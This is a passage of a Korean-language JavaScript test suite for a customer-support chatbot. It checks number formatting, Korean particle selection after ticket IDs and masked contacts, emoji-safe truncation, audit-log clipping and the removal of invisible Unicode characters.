 * 월 이용료 검증은 `toLocaleString('ko-KR')` 을 그대로 썼다 — 둘은 같은 서버 런타임에서 돈다.
 */
test('수를 끊어 적는 자가 한 벌이다 (DS 60-3)', opts, async () => {
  const N = await importLib('num', []);

  assert.equal(N.comma(0), '0');
  assert.equal(N.comma(999), '999');
  assert.equal(N.comma(1000), '1,000');
  assert.equal(N.comma(2000), '2,000');
  assert.equal(N.comma(100000), '100,000');
  assert.equal(N.comma(1234567), '1,234,567');
  // 금액 열의 음수까지 지키고(정산 CSV 의 규약), 소수점 뒤는 끊지 않는다.
  assert.equal(N.comma(-1200), '-1,200');
  assert.equal(N.comma(1234.5), '1,234.5');
  assert.equal(N.comma(-0.25), '-0.25');
  // 수가 아닌 값에는 **지어내지 않는다**(받은 그대로 글자로).
  assert.equal(N.comma(NaN), 'NaN');
  assert.equal(N.comma(Infinity), 'Infinity');
});

test('같은 상한을 웹과 카카오가 같은 자로 적는다 (DS 60-3)', opts, async () => {
  const [R, K, limits] = await Promise.all([
    importLib('refusal', []),
    importLib('kakao', ['chat', 'webhookAuth']),
    importLib('limits', []),
  ]);

  // 두 창구가 말하는 상한은 **같은 값**이다(`KAKAO_UTTERANCE_LIMIT = MAX_MESSAGE_LEN` · DS 38-1).
  assert.equal(K.KAKAO_UTTERANCE_LIMIT, limits.MAX_MESSAGE_LEN);
  assert.equal(limits.MAX_MESSAGE_LEN, 2000, '재현 조건이 바뀌었다 — 상한 값이 다르다');
  assert.ok(K.KAKAO_TOO_LONG_TEXT.includes('2,000자 이내로'), `카카오 문장이 끊어 적지 않는다: ${K.KAKAO_TOO_LONG_TEXT}`);
  assert.equal(R.tooLongMessage('message', limits.MAX_MESSAGE_LEN), '메시지는 2,000자까지 적을 수 있습니다.');
  // 이름 없는 키로 떨어지는 문장도 같은 자를 쓴다.
  assert.ok(R.tooLongMessage('sessionId', 100000).startsWith('100,000자까지'), '이름 없는 문장이 다른 자를 쓴다');
});

test('파트너 월 이용료 거절 문장도 같은 자로 적는다 (DS 60-3)', opts, async () => {
  const P = await importLib('partners', ['storage', 'logger', 'monitoring']);
  const r = P.parseMonthlyFee(999_999_999_999);
  assert.equal(r.ok, false);
  assert.match(r.error, /^월 이용료는 \d{1,3}(,\d{3})*원 이하여야 합니다\.$/, `끊어 적지 않는다: ${r.error}`);
});

/* ══════════ 61순위 — 백로그 소진 후 58차 재감사 (DS 61-1·61-2·61-3) ══════════ */

/**
 * DS 61-1 — 조사를 고르는 자(`josa`)가 **숫자·영문으로 끝나는 값에서 판정을 포기했다.**
 *
 * 종전 `hasBatchim` 은 끝 글자가 한글 음절이 아니면 전부 `null`(모른다)로 두고 받침 없는 쪽을
 * 썼다. 그런데 이 함수에 들어오는 값의 상당수는 접수번호(`ESC-0001`)·가린 연락처
 * (`010-****-5673`·`ab***@example.com`)·고객사 id(`eum`)처럼 **숫자·영문으로 끝난다.**
 * 사람은 그 값을 소리로 읽으므로(1 일 · 0 영 · m 엠) 받침은 분명히 있다.
 *
 * 그 위에 조사 짝이 하나 더 갈린다 — 「으로/로」는 **ㄹ 받침을 받침 없는 쪽처럼** 센다
 * (「서울로」 · 「ESC-0001로」). 받침 유무 하나로는 은/는·이/가·을/를과 함께 고를 수 없는데,
 * 종전 식은 그 예외를 몰라 `changedStatusMessage` 가 쓰는 짝까지 같은 자로 골랐다.
 */
test('조사를 고르는 자가 숫자·영문·ㄹ 받침을 읽는다 (DS 61-1)', opts, async () => {
  const R = await importLib('refusal', []);

  // ── ① 한글은 종전 그대로 가른다(멀쩡한 자리를 바꾸지 않았다).
  assert.equal(R.batchimOf('안내'), 'none');
  assert.equal(R.batchimOf('요금'), 'other');
  assert.equal(R.batchimOf('환불'), 'rieul');
  assert.equal(R.josa('문서 본문', '은', '는'), '문서 본문은');
  assert.equal(R.josa('카테고리', '은', '는'), '카테고리는');
  assert.equal(R.josa('예약 접수', '을', '를'), '예약 접수를');
  assert.equal(R.josa('장애 신고 접수', '을', '를'), '장애 신고 접수를');

  // ── ② ㄹ 받침 — 「으로」 짝에서만 받침 없는 쪽이다.
  assert.equal(R.josa('서울', '은', '는'), '서울은');
  assert.equal(R.josa('서울', '이', '가'), '서울이');
  assert.equal(R.josa('서울', '을', '를'), '서울을');
  assert.equal(R.josa('서울', '으로', '로'), '서울로');
  assert.equal(R.josa('부산', '으로', '로'), '부산으로');
  assert.equal(R.josa('취소', '으로', '로'), '취소로');
  // 접수 상태 라벨이 쓰는 그 짝이다(DS 46-2 의 문장) — 네 라벨 모두 그대로 읽힌다.
  assert.equal(R.changedStatusMessage('상담 중').includes('상담 중으로 바뀌었습니다'), true);
  assert.equal(R.changedStatusMessage('완료').includes('완료로 바뀌었습니다'), true);

  // ── ③ 숫자 — **접수번호가 들어오는 자리**다. 한글 독음(영·일·이·삼·사·오·육·칠·팔·구)으로 읽는다.
  const EXPECT = {
    0: ['은', '으로'], 1: ['은', '로'], 2: ['는', '로'], 3: ['은', '으로'], 4: ['는', '로'],
    5: ['는', '로'], 6: ['은', '으로'], 7: ['은', '로'], 8: ['은', '로'], 9: ['는', '로'],
  };
  for (const [d, [eun, ro]] of Object.entries(EXPECT)) {
    const id = `ESC-000${d}`;
    assert.equal(R.particle(id, '은', '는'), eun, `${id} 의 은/는 이 틀렸다`);
    assert.equal(R.particle(id, '으로', '로'), ro, `${id} 의 으로/로 가 틀렸다`);
  }
  // 종전 식은 **열 가지를 모두** 받침 없는 쪽으로 떨어뜨렸다 — 그 결함의 크기를 세어 둔다
  // (은/는 은 열 중 여섯, 으로/로 는 열 중 셋이 틀린 글자였다).
  assert.equal(Object.values(EXPECT).filter(([e]) => e === '은').length, 6, '재현 조건이 바뀌었다');
  assert.equal(Object.values(EXPECT).filter(([, r]) => r === '으로').length, 3, '재현 조건이 바뀌었다');

  // ── ④ 영문 — 자모 이름으로 읽는다(l 엘 · m 엠 · n 엔만 받침이 있다).
  assert.equal(R.josa('eum', '은', '는'), 'eum은');
  assert.equal(R.josa('gmail', '은', '는'), 'gmail은');
  assert.equal(R.josa('gmail', '으로', '로'), 'gmail로');
  assert.equal(R.josa('example.com', '이', '가'), 'example.com이');
  assert.equal(R.josa('co.kr', '이', '가'), 'co.kr가');
  // 종전에 이미 지키던 값은 그대로다(DS 29-3 의 그 자리).
  assert.equal(R.josa('CSV', '은', '는'), 'CSV는');
  assert.equal(R.josa('CSV', '을', '를'), 'CSV를');

  // ── ⑤ 값 뒤에 붙은 닫는 따옴표·괄호는 **소리가 없다** — 그 앞 글자로 판정한다.
  assert.equal(R.particle('「환불」', '은', '는'), '은');
  assert.equal(R.josa('「요금 안내」', '이', '가'), '「요금 안내」가');

  // ── ⑥ 그래도 읽을 수 없는 끝 글자·빈 값에는 받침 없는 쪽이다(종전 그대로 — 괄호를 남기지 않는다).
  assert.equal(R.batchimOf('ESC-'), null);
  assert.equal(R.josa('', '은', '는'), '는');
  assert.equal(R.josa('***-****-****', '이', '가'), '***-****-****가');
  for (const w of ['ESC-0001', 'eum', '「환불」', '', '***']) {
    for (const pair of [['은', '는'], ['이', '가'], ['을', '를'], ['으로', '로'], ['과', '와']]) {
      assert.equal(/[()]/.test(R.josa(w, pair[0], pair[1])), false, `조사 괄호가 남았다: ${w}`);
    }
  }
});

/**
 * DS 61-2 — 접수번호를 문장에 끼우는 자리가 조사를 **손으로** 적었다.
 *
 * 접수번호는 `ESC-0001` 꼴 연번이고, 고객이 받아 적어 전화로 읽어 주는 단 하나의 값이다
 * (DS 50-2). 그 값을 문장에 끼우는 자리 넷(엔진의 「앞 번호는 끝났다」 한 줄 · 카카오의
 * 「이미 접수번호 …로」 · 위젯 말풍선 둘)은 조사를 글자로 박아 두었다 — 끝 숫자에 따라
 * 「ESC-0001는」·「ESC-0010로」가 그대로 고객에게 나갔다. 여기서는 **돌려서** 확인한다.
 */
test('접수번호의 조사가 번호를 읽는 소리에 맞는다 (DS 61-2)', opts, async () => {
  const K = await importLib('kakao', ['chat', 'webhookAuth']);
  const base = { reply: '네, 도와드릴게요.', intent: 'fallback', source: 'fallback', escalate: true, confidence: 0.15 };
  const say = (id) =>
    K.toKakaoResponse(base, { filedTicket: { id, closed: false, contactOnFile: true } })
      .template.outputs.map((o) => o.simpleText.text).join('\n');

  // 「…영」·「…삼」·「…육」은 「으로」, 나머지 일곱 숫자는 「로」다.
  for (const [id, want] of [
    ['ESC-0010', '이미 접수번호 ESC-0010으로 접수돼 있어요.'],
    ['ESC-0003', '이미 접수번호 ESC-0003으로 접수돼 있어요.'],
    ['ESC-0006', '이미 접수번호 ESC-0006으로 접수돼 있어요.'],
    ['ESC-0001', '이미 접수번호 ESC-0001로 접수돼 있어요.'],
    ['ESC-0007', '이미 접수번호 ESC-0007로 접수돼 있어요.'],
    ['ESC-0009', '이미 접수번호 ESC-0009로 접수돼 있어요.'],
  ]) {
    assert.ok(say(id).includes(want), `카카오가 적는 조사가 틀렸다: ${say(id)}`);
  }
  // 조사만 바꿨다 — 문장의 나머지(회신 안내)는 종전 그대로다.
  assert.ok(say('ESC-0010').includes('다시 접수하지 않으셔도 상담원이 순서대로 연락드릴게요.'), '다른 말까지 바뀌었다');
});

/**
 * DS 61-2·61-3 — 엔진이 **고객 말풍선에** 적는 두 문장을 돌려서 본다.
 *
 *  - 「앞서 안내드린 접수번호 ESC-0001**은** 더 진행되지 않아…」 (종전 `ESC-0001는`)
 *  - 「연락처 010-****-5673**이** 접수번호 …에 등록됐어요」 (종전 `…5673가`)
 *  - 「연락처를 010-****-5670**으로** 바꿨어요」 (종전 `…5670로`)
 *
 * 가린 연락처는 전화면 **끝 네 자리**, 메일이면 **도메인**으로 끝난다(`lib/pii` 의 readable
 * 치환) — 그래서 이 자리에 오는 값은 언제나 숫자나 영문으로 끝난다.
 */
test('고객에게 되읽어 주는 번호의 조사가 맞는다 (DS 61-2·61-3)', opts, async () => {
  const GROUP = ['chat', 'session', 'handoff', 'intents', 'rules', 'escalation', 'adminStore', 'knowledge', 'normalize', 'storage', 'slots', 'tenantKB', 'tenants', 'llm'];
  const pick = (name) => importLib(name, GROUP.filter((n) => n !== name));
  const { replyTo } = await pick('chat');
  const S = await pick('session');
  const esc = await pick('escalation');

  S.resetSessions();
  esc.resetTickets();

  // ── ① 받아 적은 번호를 되읽는 문장 — 끝 숫자가 「삼」이면 「이」다.
  const sid = 'rt-ds61-readback';
  const first = replyTo('상담원 연결해 주세요', sid);
  assert.equal(first.ticketId, 'ESC-0001', '재현 조건이 바뀌었다 — 접수번호가 연번이 아니다');
  const got = replyTo('010-1234-5673', sid);
  assert.equal(got.intent, 'contact_captured', '재현 조건이 깨졌다 — 연락처를 받지 못했다');
  assert.ok(got.reply.startsWith('연락처 010-****-5673이 접수번호 ESC-0001에 등록됐어요.'), `조사가 틀렸다: ${got.reply}`);

  // ── ② 앞 접수가 닫힌 뒤 번호만 보내면 — 앞 번호가 끝났다는 한 줄과 바뀐 연락처를 함께 말한다.
  assert.equal(esc.updateTicket('ESC-0001', { status: 'resolved' }).ok, true);
  const again = replyTo('010-9999-5670', sid);
  assert.equal(again.intent, 'contact_updated', '재현 조건이 깨졌다 — 번호만 보낸 길이 아니다');
  assert.equal(again.ticketId, 'ESC-0002', '재현 조건이 깨졌다 — 번호가 새로 발급되지 않았다');
  // 「…영」이라 「으로」, 앞 번호 「…일」이라 「은」이다.
  assert.ok(again.reply.includes('연락처를 010-****-5670으로 바꿨어요.'), `조사가 틀렸다: ${again.reply}`);
  assert.ok(again.reply.includes('앞서 안내드린 접수번호 ESC-0001은 더 진행되지 않아 새로 접수했어요.'), `조사가 틀렸다: ${again.reply}`);

  // ── ③ 끝 숫자가 「이」인 번호에는 「가」다(한쪽으로 몰아 붙이지 않았다).
  const sid2 = 'rt-ds61-readback-b';
  replyTo('상담원 연결해 주세요', sid2);
  const two = replyTo('010-1234-5672', sid2);
  assert.ok(two.reply.startsWith('연락처 010-****-5672가 접수번호 '), `조사가 틀렸다: ${two.reply}`);

  // ── ④ 메일 주소는 **도메인**으로 끝난다 — `.com` 은 「…엠」이라 받침이 있다.
  const sid3 = 'rt-ds61-readback-c';
  replyTo('상담원 연결해 주세요', sid3);
  const mail = replyTo('hong@example.com', sid3);
  assert.ok(mail.reply.startsWith('연락처 ho***@example.com이 접수번호 '), `조사가 틀렸다: ${mail.reply}`);
  const sid4 = 'rt-ds61-readback-d';
  replyTo('상담원 연결해 주세요', sid4);
  const kr = replyTo('hong@gowon.co.kr', sid4);
  assert.ok(kr.reply.startsWith('연락처 ho***@gowon.co.kr가 접수번호 '), `조사가 틀렸다: ${kr.reply}`);

  S.resetSessions();
  esc.resetTickets();
});

/* ══════════ 62순위 — 백로그 소진 후 59차 재감사 (DS 62-1·62-2·62-3) ══════════ */

/** UTF-8 로 적고 다시 읽어도 같은 글자인가 — 반쪽 글자는 여기서 `�` 가 되어 걸린다. */
const survivesUtf8 = (s) => Buffer.from(s, 'utf8').toString('utf8') === s;

/**
 * DS 62-1 — **자르는 자가 글자 하나를 쪼개지 않는가**.
 *
 * `length`·`slice` 는 글자가 아니라 UTF-16 칸을 센다. 이모지 하나는 두 칸(서로게이트 쌍)이라,
 * 상한이 그 가운데 떨어지면 반쪽(`\uD83D`)만 남는다. 반쪽은 글자가 아니다 — UTF-8 로 적는
 * 순간 `�` 로 바뀌므로 CSV 내려받기·카카오 응답·브라우저 화면이 모두 그 모양으로 보인다.
 * 여기서는 그 성질(적어 둔 글자가 **그대로 돌아오는가**)을 바이트로 돌려서 본다.
 */
test('자르는 자가 글자 하나를 쪼개지 않는다 (DS 62-1)', opts, async () => {
  const L = await importLib('limits');

  // 한 글자가 여러 칸인 값들 — 상한을 한 칸씩 옮겨 가며 **모든 자리**를 지난다.
  const SAMPLES = [
    ['이모지', `${'가'.repeat(8)}🙏${'나'.repeat(8)}`],
    ['가족 이모지(이음표)', `${'가'.repeat(8)}👩‍👩‍👧${'나'.repeat(8)}`],
    ['피부색 수정자', `${'가'.repeat(8)}👍\u{1F3FB}${'나'.repeat(8)}`],
    ['변형 선택자', `${'가'.repeat(8)}✔️${'나'.repeat(8)}`],
    ['키캡', `${'가'.repeat(8)}1️⃣${'나'.repeat(8)}`],
    ['국기', `${'가'.repeat(8)}\u{1F1F0}\u{1F1F7}${'나'.repeat(8)}`],
    ['분해형 한글', `${'가'.repeat(8)}각${'나'.repeat(8)}`],
    ['라틴 결합 기호', `${'가'.repeat(8)}é${'나'.repeat(8)}`],
  ];

  for (const [name, v] of SAMPLES) {
    for (let n = 0; n <= v.length + 2; n += 1) {
      const end = L.cutEnd(v, n);
      assert.ok(end <= n, `${name}: 자른 자리가 상한을 넘었다 (n=${n})`);
      assert.ok(survivesUtf8(v.slice(0, end)), `${name}: 자른 자리가 글자를 쪼갰다 (n=${n})`);

      for (const [label, out] of [['clip', L.clip(v, n)], ['cut', L.cut(v, n)], ['ellipsize', L.ellipsize(v, n)]]) {
        assert.ok(out.length <= n, `${name}/${label}: 결과가 상한을 넘었다 (n=${n})`);
        assert.ok(survivesUtf8(out), `${name}/${label}: 반쪽 글자가 남았다 (n=${n}) — ${JSON.stringify(out)}`);
      }
    }
  }

  // ── 종전 식이 실제로 깨지는 자리인가(재현 조건 확인) — 고치지 않았다면 여기서 `�` 가 된다.
  const body = `${'가'.repeat(291)}🙏${'나'.repeat(50)}`;
  assert.equal(
    survivesUtf8(`${body.slice(0, 300 - L.CLIP_MARK.length)}${L.CLIP_MARK}`),
    false,
    '재현 조건이 성립하지 않는다 — 종전 식도 멀쩡하다',
  );
  assert.ok(survivesUtf8(L.clip(body, 300)), '접수 본문 상한이 글자를 쪼갠다');
  assert.ok(L.clip(body, 300).endsWith(L.CLIP_MARK), '잘랐다고 말하지 않는다');

  // ── 종전에 지키던 값은 그대로다(평범한 한국어는 한 글자 한 칸이라 바뀔 것이 없다).
  assert.equal(L.clip('짧은 글', 100), '짧은 글');
  assert.equal(L.clip('가'.repeat(20), 10), `${'가'.repeat(2)}${L.CLIP_MARK}`);
  assert.equal(L.ellipsize('가'.repeat(20), 10), `${'가'.repeat(9)}…`);
  assert.equal(L.cut('가'.repeat(20), 10), '가'.repeat(10));
  assert.equal(L.ellipsize('짧은 글', 100), '짧은 글');
  assert.equal(L.ellipsize('', 10), '');
  assert.equal(L.ellipsize('가나다 라마바', 5), '가나다…', '값 끝의 공백을 표시 앞에 남긴다');
  // 한 글자도 들어가지 않으면 표시만 남는다 — 반쪽 글자를 남기는 쪽보다 낫다.
  assert.equal(L.ellipsize('🙏🙏', 2), '…');
});

/**
 * DS 62-2 — **고객이 읽는 글**을 자르는 자리.
 *
 * 카카오 말풍선 나누기(DS 37-3)는 끊을 자리를 못 찾으면 상한에서 그대로 끊었다. 한국어
 * 답변은 공백·마침표 없이 길게 이어지는 일이 흔해 그 길이 실제로 쓰이는 길이고, 상한이
 * 이모지 가운데 떨어지면 **앞 말풍선 끝과 뒤 말풍선 첫 글자가 둘 다** `�` 였다.
 */
test('고객이 읽는 글이 반쪽 글자로 끝나지 않는다 (DS 62-2)', opts, async () => {
  const GROUP = ['chat', 'session', 'handoff', 'intents', 'rules', 'escalation', 'adminStore', 'knowledge', 'normalize', 'storage', 'slots', 'tenantKB', 'tenants', 'llm', 'limits', 'webhookAuth'];
  const K = await importLib('kakao', GROUP);
  const KN = await importLib('knowledge', ['normalize', 'tenants', 'limits']);
  const LLM = await importLib('llm', ['monitoring', 'logger', 'limits']);

  // ── ① 말풍선 나누기 — 상한(1000칸)이 이모지 가운데 떨어지는 답변.
  const long = `${'안'.repeat(999)}🙏${'녕'.repeat(300)}`;
  const split = K.splitKakaoText(long);
  assert.ok(split.parts.length >= 2, '재현 조건이 성립하지 않는다 — 나눠지지 않았다');
  for (const [i, p] of split.parts.entries()) {
    assert.ok(survivesUtf8(p), `${i}번째 말풍선이 반쪽 글자로 끝난다: ${JSON.stringify(p.slice(-2))}`);
    assert.ok(p.length <= K.KAKAO_TEXT_LIMIT, `${i}번째 말풍선이 상한을 넘었다`);
  }
  // 쪼개지 않았으므로 이모지는 **뒤 말풍선에 온전히** 있다(버리지도 않았다).
  assert.ok(split.parts.join('').includes('🙏'), '이모지를 버렸다');

  // 끊을 자리를 찾는 네 길(문단·줄바꿈·문장 끝·공백)은 종전 그대로다.
  const lines = K.splitKakaoText(`${'가'.repeat(60)}\n${'나'.repeat(60)}`, 100, 2);
  assert.deepEqual(lines.parts, ['가'.repeat(60), '나'.repeat(60)], '줄바꿈으로 끊는 길이 바뀌었다');

  // ── ② 바로가기 버튼 라벨 — 운영자가 적은 질문이 그대로 들어온다.
  const res = K.toKakaoResponse({
    reply: '네, 안내드릴게요.',
    intent: 'faq',
    source: 'kb',
    // 상한(14칸)이 이모지 **가운데** 떨어지는 질문 — 종전 식(`slice(0, 13)`)은 반쪽을 남겼다.
    suggestions: [{ question: `${'환불'.repeat(6)}🙏${'녕'.repeat(5)}` }, { question: '짧은 질문' }],
  });
  for (const q of res.template.quickReplies) {
    assert.ok(q.label.length <= K.KAKAO_LABEL_LEN, `라벨이 ${K.KAKAO_LABEL_LEN}자를 넘었다: ${q.label}`);
    assert.ok(survivesUtf8(q.label), `라벨이 반쪽 글자로 끝난다: ${JSON.stringify(q.label)}`);
  }
  assert.equal(res.template.quickReplies[1].label, '짧은 질문', '짧은 라벨까지 줄였다');

  // ── ③ 인용 발췌 — 운영자가 적은 답변의 한 문장이다.
  //    상한(140칸)이 이모지 가운데 떨어지도록 앞 138칸을 채운다(종전 식은 139칸에서 잘랐다).
  const cite = KN.buildCitation(
    {
      id: 'kb_cut', category: '요금', question: '환불 수수료', keywords: ['환불'],
      answer: `${'환불 수수료는 결제 수단에 따라 다르게 적용됩니다 '.repeat(4)}${'가'.repeat(26)}🙏 자세한 내용은 안내드릴게요`,
    },
    '환불 수수료',
    [{ keyword: '환불' }],
  );
  assert.ok(cite.snippet.length <= 140, '발췌가 상한을 넘었다');
  assert.ok(survivesUtf8(cite.snippet), `발췌가 반쪽 글자로 끝난다: ${JSON.stringify(cite.snippet.slice(-2))}`);
  assert.ok(cite.snippet.endsWith('…'), '줄였으면 줄였다고 말하지 않는다');

  // ── ④ 생성 답변의 상한 — 잘랐다고 **말한다**(종전에는 문장 중간에서 조용히 끊겼다).
  const answer = LLM.sanitizeAnswer(`${'안'.repeat(899)}🙏${'녕'.repeat(50)}`, 900);
  assert.ok(answer.length <= 900, '생성 답변이 상한을 넘었다');
  assert.ok(survivesUtf8(answer), '생성 답변이 반쪽 글자로 끝난다');
  assert.ok(answer.endsWith('…(이하 생략)'), '잘랐다고 말하지 않는다');
  assert.equal(LLM.sanitizeAnswer('짧은 답입니다.', 900), '짧은 답입니다.', '짧은 답까지 줄였다');
});

/**
 * DS 62-3 — **운영자가 적은 이름**을 기록에 싣는 자리.
 *
 * 감사 로그는 영구히 남고 정산 분쟁에서 꺼내는 글이다. 그런데 「대상」·「내용」의 상한은
 * `lib/audit.ts` 안의 `slice(0, 100)`·`slice(0, 300)` 이었고, 다섯 라우트가 그 안에 싣는
 * 이름도 각각 `slice(0, 60)`·`slice(0, 40)` 으로 **잘렸다고 말하지 않고** 끊었다.
 * 쓰는 쪽과 복원하는 쪽이 같은 자를 지나는지도 함께 본다(한쪽만 고치면 복원분만 꼬리를 잃는다).
 */
test('관리 작업 기록이 줄인 것을 줄였다고 적는다 (DS 62-3)', opts, async () => {
  const A = await importLib('audit', ['storage', 'csv', 'kst', 'refusal', 'retention', 'num', 'limits']);
  const L = await importLib('limits');

  A.resetAudit();
  // ── ① 쓰는 쪽 — 상한을 넘기면 표시를 남기고, 글자를 쪼개지 않는다.
  const detail = `${'가'.repeat(L.AUDIT_DETAIL_LEN - 1)}🙏${'나'.repeat(20)}`;
  const target = `${'대'.repeat(L.AUDIT_TARGET_LEN - 1)}🙏`;
  const e = A.logAudit({ action: 'kb.upsert', target, detail, authed: true });
  assert.ok(e.detail.length <= L.AUDIT_DETAIL_LEN, '내용이 상한을 넘었다');
  assert.ok(e.target.length <= L.AUDIT_TARGET_LEN, '대상이 상한을 넘었다');
  assert.ok(e.detail.endsWith(L.CLIP_MARK), '내용을 줄이고 말하지 않는다');
  assert.ok(e.target.endsWith(L.CLIP_MARK), '대상을 줄이고 말하지 않는다');
  assert.ok(survivesUtf8(e.detail) && survivesUtf8(e.target), '기록이 반쪽 글자를 들고 있다');
  // 짧은 값은 종전 그대로다.
  assert.equal(A.logAudit({ action: 'kb.delete', target: 'KB-1', detail: '삭제: 환불 안내', authed: true }).detail, '삭제: 환불 안내');

  // ── ② CSV 로 내려받아도 글자가 그대로다(바이트로 적히는 자리다).
  const csv = A.auditToCsv();
  assert.ok(survivesUtf8(csv), 'CSV 가 반쪽 글자를 들고 있다');
  assert.ok(csv.includes(L.CLIP_MARK), 'CSV 에 줄였다는 표시가 없다');

  // ── ③ 복원하는 쪽도 **같은 자**를 지난다 — 합친 백업이 들고 온 긴 줄에서도 그렇다.
  const snap = A.exportAudit();
  A.resetAudit();
  const r = A.importAudit({
    ...snap,
    events: [{ id: 'A-000001', at: '2026-01-02T03:04:05.000Z', action: 'kb.upsert', target: `${'옛'.repeat(L.AUDIT_TARGET_LEN - 1)}🙏`, detail, authed: true }],
  });
  assert.equal(r.ok, true, `복원이 거절됐다: ${r.error ?? ''}`);
  const back = A.listAudit(10).find((x) => x.id === 'A-000001');
  assert.ok(back, '복원한 줄을 찾지 못했다');
  assert.ok(back.detail.length <= L.AUDIT_DETAIL_LEN && back.detail.endsWith(L.CLIP_MARK), '복원분만 줄인 것을 말하지 않는다');
  assert.ok(survivesUtf8(back.detail) && survivesUtf8(back.target), '복원분이 반쪽 글자를 들고 있다');

  A.resetAudit();
});

/* ══════════ 63순위 — 60차 재감사 (DS 63-1·63-2) ══════════ */

/**
 * 한 글자도 보이지 않는 값들 — 모두 `length` 에 세어지고 **`trim()` 이 지우지 않는다**.
 * (`\u{feff}` 는 `trim()` 도 양 끝에서는 지운다 — 그래서 여기 두지 않고 가운데에 섞어 따로 본다.)
 */
const INVISIBLE_ONLY = [
  '\u{200b}',            // 제로폭 공백 — 표·PDF 에서 붙여 넣으면 칸 사이에 들어온다
  '\u{ad}',            // 소프트 하이픈 — 줄 끝마다 들어온다
  '\u{202e}',            // 방향 바꾸기(RLO)
  '\u{2060}\u{2064}',      // 이음 금지·보이지 않는 더하기
  '\u0001\u001f\u007f', // 제어 문자
  ' \u{200b} \u{ad} ',   // 공백과 섞인 것
];

/**
 * DS 63-1 — **보이지 않는 글자**를 받는 자리.
 *
 * 59차는 「한 글자가 여러 칸인 쪽」을 보았다. 이번은 반대쪽이다 — 칸은 차지하는데 아무것도
 * 보이지 않는 글자다. `trim()` 은 그것을 글자로 세므로 ① 아무것도 보이지 않는 값이 필수 검사를
 * 통과해 저장되고 ② 길이 상한을 그 글자가 먹는다. 웹(`http.optStr`)과 카카오(`parseKakaoPayload`)가
 * **같은 자**를 쓰는지까지 본다(DS 38-1 이 상한에서 세운 규칙과 같은 까닭이다).
 */
test('보이지 않는 글자만 적은 값은 빈 값이다 (DS 63-1)', opts, async () => {
  const T = await importLib('text');
  const K = await importLib('kakao', ['webhookAuth', 'text']);

  // ── ① 종전 식 재현 — `trim()` 은 이 값들을 **글자로 센다**(이것이 결함의 크기다).
  for (const v of INVISIBLE_ONLY) {
    assert.ok(v.trim().length > 0, `재현이 깨졌다(이미 trim 이 지운다): ${JSON.stringify(v)}`);
    assert.equal(T.cleanText(v), '', `보이지 않는 값이 남았다: ${JSON.stringify(v)}`);
    assert.equal(T.isBlank(v), true, `빈 값이 아니라고 말한다: ${JSON.stringify(v)}`);
  }
  // 가운데에 섞인 바이트 순서 표시 — `trim()` 은 양 끝만 보므로 글자 사이에서는 지우지 못한다.
  assert.notEqual('환불\u{feff}정책'.trim(), '환불정책', '재현이 깨졌다(trim 이 가운데까지 지운다)');
  assert.equal(T.cleanText('환불\u{feff}정책'), '환불정책', '글자 사이의 보이지 않는 값이 남았다');
  assert.equal(T.isBlank('\u{200b}\u{feff}\u{200b}'), true, '섞인 보이지 않는 값이 남았다');

  // ── ② 보이는 글자는 그대로 남는다 — 지우는 것은 보이지 않는 것뿐이다.
  assert.equal(T.cleanText('  환불\u{200b}정책  '), '환불정책');
  assert.equal(T.cleanText('가온\u{202e}파트너스'), '가온파트너스', '방향 바꾸기가 값에 남았다');
  assert.equal(T.cleanText('첫 줄\r\n둘째 줄'), '첫 줄\n둘째 줄', '줄바꿈 표기가 한 가지가 아니다');
  assert.equal(T.cleanText('010\u{a0}1234'), '010 1234', '줄바꿈 없는 공백이 보통 공백이 되지 않는다');
  assert.equal(T.cleanText('표\t칸\n줄'), '표\t칸\n줄', '탭·줄바꿈까지 지웠다');

  // ── ③ **글자를 이루는** 보이지 않는 글자는 지킨다 — 59차가 한 글자로 묶어 둔 것들이다.
  for (const v of ['👩‍👩‍👧', '👍🏻', '✔️', '1️⃣', '🇰🇷']) {
    assert.equal(T.cleanText(v), v, `한 글자를 쪼갰다: ${JSON.stringify(v)}`);
    assert.ok(survivesUtf8(T.cleanText(v)), '반쪽 글자가 됐다');
  }

  // ── ④ 카카오 창구도 같은 자를 쓴다 — 보이지 않는 발화는 엔진까지 가지 않는다.
  for (const v of INVISIBLE_ONLY) {
    const r = K.parseKakaoPayload({ userRequest: { utterance: v, user: { id: 'u1' } } });
    assert.equal(r.ok, false, `보이지 않는 발화를 받았다: ${JSON.stringify(v)}`);
    assert.equal(r.reason, 'empty', '빈 발화를 「너무 길다」로 거절한다');
  }
  const ok = K.parseKakaoPayload({ userRequest: { utterance: ' 환불\u{200b} 되나요? ', user: { id: '\u{200b}u9 ' } } });
  assert.equal(ok.ok, true, '보이는 말이 있는 발화를 거절했다');
  assert.equal(ok.utterance, '환불 되나요?', '발화에 보이지 않는 글자가 남았다');
  assert.equal(ok.userId, 'u9', '사용자 id 에 보이지 않는 글자가 남았다');

  // ── ⑤ 상한은 **보이는 글자**로 잰다 — 보이지 않는 글자가 상한을 먹지 않는다.
  const padded = `${'가'.repeat(K.KAKAO_UTTERANCE_LIMIT)}${'\u{200b}'.repeat(50)}`;
  assert.equal(K.parseKakaoPayload({ userRequest: { utterance: padded } }).ok, true, '보이지 않는 글자가 상한을 먹었다');
  const over = '가'.repeat(K.KAKAO_UTTERANCE_LIMIT + 1);
  assert.equal(K.parseKakaoPayload({ userRequest: { utterance: over } }).reason, 'too_long', '상한 자체가 풀렸다');
});

/**
 * DS 63-2 — 「같은 말인가」를 묻는 자가 **보이지 않는 글자를 모른다**.
 *
 * 눈에 똑같이 보이는 두 글이 비교에서 갈라지면, 운영자가 PDF 에서 붙여 넣은 자료는 검색으로
 * 찾을 수 없고(그 자료를 고치려면 먼저 찾아야 한다), 「답하지 못한 질문」은 같은 질문을 두 줄로
 * 센다 — 그 목록의 순서가 곧 운영자가 다음에 할 일이다(DS 32-2).
 */
test('보이지 않는 글자가 섞여도 같은 말로 본다 (DS 63-2)', opts, async () => {
  const N = await importLib('normalize', ['text']);
  const base = '환불정책';
  const variants = [
    '환불\u{200b}정책',   // 제로폭 공백
    '환불\u{ad}정책',   // 소프트 하이픈
    '환불\u{feff}정책',   // 바이트 순서 표시
    '환불\u{200d}정책',   // 이음표(비교에서는 없는 것과 같다)
    '환\u{202d}불정책',   // 방향 바꾸기
    '환불 정책',        // 띄어쓰기(종전에도 같은 말이었다 — 회귀 확인)
  ];
  for (const v of variants) {
    assert.equal(N.compact(v), N.compact(base), `같은 말이 갈라졌다: ${JSON.stringify(v)}`);
  }
  // 종전 식 재현 — NFC 만으로는 합쳐지지 않는다(정규화가 덮지 못하는 쪽이다).
